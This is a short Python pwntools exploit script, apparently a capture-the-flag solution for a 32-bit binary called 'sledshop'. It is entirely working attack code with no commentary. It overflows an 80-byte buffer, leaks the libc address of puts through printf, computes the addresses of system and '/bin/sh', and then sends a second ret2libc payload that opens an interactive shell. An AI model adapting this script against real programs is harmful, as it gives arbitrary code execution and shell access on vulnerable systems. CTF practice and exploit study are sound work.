from pwn import *

e = ELF('./443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop')
libc = ELF('/lib32/libc.so.6')
p = process('./443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop')

payload = 'A'*80
payload += p32(e.symbols['printf'])
payload += p32(e.symbols['main'])
payload += p32(e.got['puts'])

print p.recvuntil('like?\n')
p.sendline(payload)
print p.recvline()
ret = u32(p.recvline()[:4])
print "ret: " + hex(ret)

libc_base_addr = ret - libc.symbols['puts']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*80
payload += p32(system_addr)
payload += 'AAAA'
payload += p32(binsh_addr)

print p.recvuntil('like?\n')
p.sendline(payload)
p.interactive()